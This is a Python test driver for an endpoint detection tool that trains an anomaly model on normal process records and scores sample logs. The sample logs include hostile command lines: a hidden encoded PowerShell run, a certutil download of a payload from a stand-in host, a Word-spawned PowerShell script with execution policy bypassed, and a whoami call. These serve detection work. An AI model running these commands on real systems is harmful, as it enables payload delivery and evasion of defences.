import json
from detector import detect_suspicious_activity, train_anomaly_detector

def main():
    # 1. Sample normal data to train the ML model
    normal_training_data = [
        {
            "process_name": "chrome.exe",
            "command_line": '"C:\\Program Files\\Google\\Chrome\\chrome.exe"',
            "parent_process": "explorer.exe",
            "risk_score": 0
        },
        {
            "process_name": "notepad.exe",
            "command_line": "notepad.exe",
            "parent_process": "explorer.exe",
            "risk_score": 0
        },
        {
            "process_name": "cmd.exe",
            "command_line": "cmd.exe /c vol",
            "parent_process": "explorer.exe",
            "risk_score": 0
        },
        {
            "process_name": "calc.exe",
            "command_line": "calc.exe",
            "parent_process": "explorer.exe",
            "risk_score": 0
        }
    ]

    print("--- Training Anomaly Detector ---")
    ml_model = train_anomaly_detector(normal_training_data)
    print("Model trained successfully.\n")

    # 2. Example input as specified: a list of dictionaries
    sample_logs = [
        # Normal Activity
        {
            "process_name": "chrome.exe",
            "command_line": '"C:\\Program Files\\Google\\Chrome\\chrome.exe"',
            "parent_process": "explorer.exe",
            "user": "DOMAIN\\Alice",
            "timestamp": "2026-03-25T10:00:00Z"
        },
        # Suspicious Activity 1: encoded powershell
        {
            "process_name": "powershell.exe",
            "command_line": "powershell.exe -WindowStyle Hidden -EncodedCommand JABzAD0ATgBlAHcALQBP...",
            "parent_process": "cmd.exe",
            "user": "DOMAIN\\Bob",
            "timestamp": "2026-03-25T10:05:00Z"
        },
        # Suspicious Activity 2: payload download using certutil
        {
            "process_name": "certutil.exe",
            "command_line": "certutil.exe -urlcache -split -f http://malicious.com/payload.exe payload.exe",
            "parent_process": "cmd.exe",
            "user": "DOMAIN\\Charlie",
            "timestamp": "2026-03-25T10:15:00Z"
        },
        # Suspicious Activity 3: Word macro spawning powershell
        {
            "process_name": "powershell.exe",
            "command_line": "powershell.exe -ExecutionPolicy Bypass -File C:\\Windows\\Temp\\script.ps1",
            "parent_process": "winword.exe",
            "user": "DOMAIN\\Dave",
            "timestamp": "2026-03-25T10:30:00Z"
        },
        # Suspicious Activity 4: explorer spawning cmd (Should be flagged but not super high rule-based)
        {
            "process_name": "cmd.exe",
            "command_line": "cmd.exe /c whoami",
            "parent_process": "explorer.exe",
            "user": "DOMAIN\\Eve",
            "timestamp": "2026-03-25T10:45:00Z"
        }
    ]

    print("--- Input Logs (Enrichment Ready) ---")
    print(json.dumps(sample_logs, indent=4))
    print("\n" + "="*50 + "\n")

    # 3. Run detection combining Rules and ML
    analyzed_logs = detect_suspicious_activity(sample_logs, ml_model=ml_model)

    print("--- Output Logs (With ML Anomaly Score and Risk Level) ---")
    print(json.dumps(analyzed_logs, indent=4))

if __name__ == "__main__":
    main()
